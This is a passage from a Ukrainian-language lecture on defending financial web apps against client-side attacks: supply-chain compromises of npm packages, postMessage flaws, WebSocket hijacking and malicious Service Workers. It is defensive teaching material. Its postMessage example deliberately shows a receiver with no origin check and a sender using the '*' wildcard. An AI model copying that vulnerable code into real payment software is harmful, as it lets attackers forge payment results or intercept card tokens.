    if (key === '__proto__' || key === 'constructor') continue;
    if (!source.hasOwnProperty(key)) continue;
    target[key] = source[key];
  }
}
// Також: Object.create(null), Map замість {}, Object.freeze(Object.prototype)

Supply Chain атаки на JavaScript-залежності

Наступний вектор стосується не вразливостей у коді самого додатку, а вразливостей у його залежностях. Supply chain атаки (атаки на ланцюг постачання) — це компрометація сторонніх JavaScript-бібліотек або CDN для розповсюдження шкідливого коду серед усіх проєктів, що їх використовують. Сучасний веб-додаток може мати сотні і навіть тисячі транзитивних залежностей. Для фінансового сектору це критична загроза: одна скомпрометована залежність у ланцюгу може непомітно вразити мільйони користувачів. Розглянемо основні типи таких атак:

  • event-stream (2018): зловмисник отримав права на популярний npm-пакет (2 млн завантажень/тижд.) та додав код для крадіжки Bitcoin-гаманців з додатку Copay.
  • ua-parser-js (2021): пакет з 8 млн завантажень/тижд. був скомпрометований для встановлення криптомайнера та трояна.
  • Друкарські помилки в назвах (Typosquatting): створення пакетів із назвами, схожими на популярні (lodahs замість lodash), із шкідливим кодом усередині.
  • Плутанина залежностей (Dependency Confusion): зловмисник публікує пакет у публічному npm із такою самою назвою, як внутрішній пакет компанії. Менеджер пакетів завантажує публічну версію замість приватної.
  • Компрометація мейнтейнера (Compromised Maintainer): зловмисник отримує доступ до npm-акаунту мейнтейнера через фішинг або витік паролів і публікує шкідливу версію.

Масштаб проблеми важко переоцінити. За даними дослідження Synk, середній проєкт на Node.js має понад 300 транзитивних залежностей. Це означає, що навіть якщо ваш код ідеальний, ви залежите від сотень бібліотек, написаних різними людьми з різним рівнем безпеки. У фінансовому секторі, де одна скомпрометована залежність може дати доступ до платіжних даних мільйонів користувачів, управління supply chain ризиками є обов'язковою частиною програми безпеки.

Захист: фіксація версій через lockfile (npm ci), регулярний npm audit, блокування postinstall-скриптів у .npmrc, SRI для CDN-ресурсів, приватний реєстр для внутрішніх пакетів (захист від Dependency Confusion).

PostMessage: міжвіконна комунікація та її вразливості

Сучасні фінансові додатки часто використовують iframe для інтеграції сторонніх сервісів: платіжних віджетів, 3D Secure верифікації кредитних карток, систем єдиного входу (SSO). Для комунікації між основним вікном і цими iframe використовується API window.postMessage(). Цей API був створений саме для безпечної міжвіконної комунікації між різними origins, оскільки Same-Origin Policy забороняє пряму взаємодію. Однак, як і будь-який потужний інструмент, при неправильній реалізації postMessage створює серйозні вразливості.

  • Відсутність перевірки origin: якщо отримувач не перевіряє event.origin, будь-який сайт може відправити шкідливе повідомлення.
  • Надмірна довіра до даних: дані з postMessage використовуються без валідації (наприклад, вставляються в DOM через innerHTML).
  • Витік даних: відправник використовує postMessage(data, '*') замість конкретного origin — дані можуть бути перехоплені шкідливим вікном.
// PostMessage — вразливий vs безпечний код
// Контекст: банківський додаток використовує iframe
// для 3D Secure верифікації кредитної картки

// ❌ ВРАЗЛИВИЙ отримувач — немає перевірки origin
window.addEventListener('message', function(event) {
  // Будь-який сайт може відправити це повідомлення!
  const paymentResult = JSON.parse(event.data);
  if (paymentResult.status === 'success') {
    completePayment(paymentResult.transactionId);
    // Зловмисник може підробити результат 3D Secure!
  }
});

// ❌ ВРАЗЛИВИЙ відправник — wildcard origin
iframe.contentWindow.postMessage(
  JSON.stringify({ cardToken: 'tok_123', amount: 5000 }),
  '*' // Будь-хто може перехопити це повідомлення!
);

// ---

// ✅ БЕЗПЕЧНИЙ отримувач — сувора перевірка origin
window.addEventListener('message', function(event) {
  // 1. Перевірка origin відправника
  const trustedOrigins = [
    'https://3dsecure.bank.com',
    'https://payment.provider.com'
  ];
  if (!trustedOrigins.includes(event.origin)) {
    console.warn('Повідомлення від недовіреного origin:', event.origin);
    return; // Ігноруємо повідомлення
  }

  // 2. Валідація структури даних
  let data;
  try {
    data = JSON.parse(event.data);
  } catch (e) {
    return; // Невалідний JSON
  }

  // 3. Перевірка типу повідомлення та обов'язкових полів
  if (data.type !== '3ds_result' || !data.transactionId) {
    return;
  }

  // 4. Додаткова серверна верифікація
  verifyPaymentOnServer(data.transactionId);
});

// ✅ БЕЗПЕЧНИЙ відправник — конкретний origin
iframe.contentWindow.postMessage(
  JSON.stringify({ cardToken: 'tok_123', amount: 5000 }),
  'https://3dsecure.bank.com' // Лише цей origin отримає дані
);

Cross-Site WebSocket Hijacking (CSWSH)

Наступний вектор — це атака на WebSocket-з'єднання. Протокол WebSocket широко використовується у фінансових додатках, і це логічно: він забезпечує двосторонню комунікацію в реальному часі, що ідеально підходить для відображення котирувань, оновлень балансу та push-сповіщень про транзакції. Однак WebSocket має специфічні вразливості, які принципово відрізняються від звичайних HTTP-запитів і часто залишаються поза увагою розробників.

  • Cross-Site WebSocket Hijacking (CSWSH): аналог CSRF для WebSocket. При встановленні WebSocket-з'єднання браузер автоматично надсилає cookies, але WebSocket не підпадає під Same-Origin Policy. Зловмисний сайт може відкрити WebSocket-з'єднання до банківського сервера з cookies жертви.
  • Відсутність вбудованої автентифікації: протокол WebSocket не має стандартного механізму автентифікації після handshake. Якщо автентифікація перевіряється лише при підключенні, після компрометації з'єднання всі повідомлення вважаються автентифікованими.
  • Ін'єкції через WebSocket: дані, отримані через WebSocket, можуть бути вразливі до XSS, якщо вставляються в DOM без санітизації (наприклад, оновлення стрічки транзакцій у реальному часі).

Захист від CSWSH: перевірка Origin-заголовка при handshake, автентифікація через одноразовий токен (замість cookie), валідація кожного повідомлення за whitelist дозволених дій.

Атаки на Service Workers

Останній, але надзвичайно важливий вектор стосується Service Workers — потужного браузерного API, який працює як проксі-сервер між додатком та мережею. Фактично Service Worker — це JavaScript-файл, який браузер завантажує та виконує у фоновому режимі, окремо від веб-сторінки. У фінансових додатках Service Workers використовуються для офлайн-функціональності, кешування ресурсів та push-сповіщень. Але саме ця потужність робить їх надзвичайно небезпечними у разі компрометації: зловмисник, який зареєструє шкідливий Service Worker, отримує постійний контроль над усіма мережевими запитами додатку.

  • Постійність: Service Worker залишається активним навіть після закриття вкладки і переживає XSS — навіть якщо XSS-вразливість виправлена, шкідливий Service Worker продовжує працювати.
  • Перехоплення запитів: через fetch event Service Worker може модифікувати будь-який запит та відповідь — підміна балансу рахунку, зміна реквізитів переказу, крадіжка токенів автентифікації.
  • Вектор реєстрації: для реєстрації шкідливого Service Worker зловмиснику потрібна XSS-вразливість та JS-файл на тому самому origin (може бути JSONP-ендпоінт або файл завантажений через іншу вразливість).
  • Захист: суворий CSP із забороною eval() та inline-скриптів, заголовок Service-Worker-Allowed, моніторинг реєстрації Service Workers через navigator.serviceWorker.getRegistrations().

Підсумок

Підведемо підсумки того, що ми розглянули на цій лекції. Ми пройшли великий шлях — від базових концепцій XSS до сучасних атак на Service Workers та supply chain.

У цій лекції ми детально розглянули клієнтські атаки на фінансові веб-додатки. XSS у всіх його формах (Reflected, Stored, DOM-based), а також його сучасні різновиди — Mutation XSS та Blind XSS — залишаються найпоширенішими і найнебезпечнішими вразливостями. У фінансовому контексті це пряма загроза грошам клієнтів: від крадіжки сесій до підміни реквізитів переказів у реальному часі. Особливу увагу заслуговують вразливості у SPA-фреймворках (React, Angular, Vue), де розробники можуть несвідомо обійти вбудований захист.

CSRF, включаючи Login CSRF та атаки на JSON API, дозволяє виконувати несанкціоновані транзакції від імені жертви. Клікджекінг та його вдосконалені форми (Drag-and-Drop Clickjacking) маскують критичні дії під нешкідливі кліки. Атаки на клієнтське сховище та формджекінг демонструють, чому правильне управління токенами та ізоляція платіжних форм є критичними.

Сучасні вектори атак — Prototype Pollution, supply chain атаки на npm-залежності, вразливості postMessage та Cross-Site WebSocket Hijacking — розширюють поверхню атаки далеко за межі класичних XSS та CSRF. Компрометація Service Worker дає зловмиснику постійний контроль над додатком.

Сучасний стек захисту — CSP із nonce-based підходом, SRI, довірені типи (Trusted Types), комплекс заголовків безпеки, DOMPurify, правильне екранування виводу та аудит залежностей — забезпечує багаторівневий захист (defense in depth) від усього спектру клієнтських атак. Ключовий висновок: жоден окремий механізм не є достатнім. Лише комбінація кількох рівнів захисту створює надійний бар'єр, де кожен рівень компенсує можливі недоліки іншого.

Для фахівця з фінансової безпеки важливо пам'ятати: клієнтські атаки постійно еволюціонують. Щороку з'являються нові техніки обходу CSP, нові вектори Prototype Pollution, нові supply chain атаки. Тому захист — це не одноразова конфігурація, а безперервний процес моніторингу, оновлення та адаптації до нових загроз.
